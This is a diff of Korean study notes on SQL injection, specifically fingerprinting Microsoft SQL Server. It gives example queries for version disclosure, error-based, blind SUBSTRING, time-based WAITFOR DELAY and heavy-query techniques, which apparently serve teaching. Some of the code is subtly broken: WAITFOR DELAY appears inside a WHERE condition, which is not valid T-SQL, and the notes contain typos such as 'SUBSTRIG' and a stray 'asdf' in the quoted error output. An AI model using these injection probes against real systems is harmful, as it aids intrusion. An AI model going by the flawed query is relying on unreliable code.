@@ -1134,3 +1134,47 @@
 <br/>
 
 * DBMS Fingerprinting: **MSSQL**
+    - 쿼리 실행 결과 출력: *version*
+        + ```@@version```(환경변수)를 이용해 DBMS의 버전과 운영체제 정보를 알아낼 수 있음
+            ```sql
+            SELECT @@version;
+            /* 출력 결과 예시
+                Microsoft SQL Server 2017 (RTM-CU13) (KB4466404) - 14.0.3048.4 (X64) → 사용하고 있는 DBMS의 종류와 버전
+                    Nov 30 2018 12:57:58 
+                    Copyright (C) 2017 Microsoft Corporation
+                    Developer Edition (64-bit) on Linux (Ubuntu 16.04.5 LTS) → 현재 DBMS가 운영되고 있는 운영체제의 정보
+            */
+            ```
+    - 에러 메시지 출력: *error*
+        + ```UNION``` 문으로 에러 메시지를 출력한 다음, 에러 메시지에 포함된 키워드로 MSSQL에서 출력된 문자열임을 알 수 있음
+            ```sql
+            SELECT 1 UNION SELECT 1, 2; -- UNION문의 컬럼 개수가 일치하지 않으면 에러를 발생시킨다는 점을 이용함
+            /* 출력 결과 예시
+                All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.asdf
+            */
+            ```
+    - 참 또는 거짓 출력: *Blind*
+        + ```@@version```(환경변수)에서 가져온 버전의 각 위치에 해당하는 문자를 ```SUBSTRING``` 함수를 통해 Blind SQL Injection으로 알아낼 수 있음
+            ```sql
+            -- @@version의 내용: 'Microsoft SQL Server 2017 ...'
+            -- SUBSTRIG(@@version, 1, 1) → version 환경변수의 첫 번째 문자 = 'M'
+
+            SELECT 1 FROM test WHERE SUBSTRING(@@version, 1, 1) = 'M'; -- @@version의 첫 번째 문자가 'M'인지 확인 → 1을 출력함 (True)
+            SELECT 1 FROM test WHERE SUBSTRING(@@version, 1, 1) = 'N'; -- @@version의 첫 번째 문자가 'N'인지 확인 → 아무것도 출력하지 않음 (False)
+            ```
+    - 예외 상황: *Time based*
+        + 애플리케이션에서 쿼리 실행 결과를 반환하지 않을 때 ```WAITFOR DELAY```를 사용하여 시간 지연 발생 여부로 그 결과를 알아낼 수 있음
+            ```sql
+            -- SUBSTRIG(@@version, 1, 1) → version 환경변수의 첫 번째 문자 = 'M'
+            
+            SELECT 1 FROM test WHERE SUBSTRING(@@version, 1, 1) = 'M' AND WAITFOR DELAY '0:0:5'; -- AND 앞의 식이 참이므로 WAITFOR DELAY가 실행되어 5초 지연됨
+            SELECT 1 FROM test WHERE SUBSTRING(@@version, 1, 1) = 'N' AND WAITFOR DELAY '0:0:5'; -- AND 앞의 식이 거짓이므로 WAITFOR DELAY는 실행되지 않음 (지연 미발생)
+            ```
+        + 헤비 쿼리를 이용할 수도 있음
+            ```sql
+            SELECT (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D, information_schema.columns E, information_schema.columns F);
+            ```
+
+<br/>
+
+* DBMS Fingerprinting: **PostgreSQL**
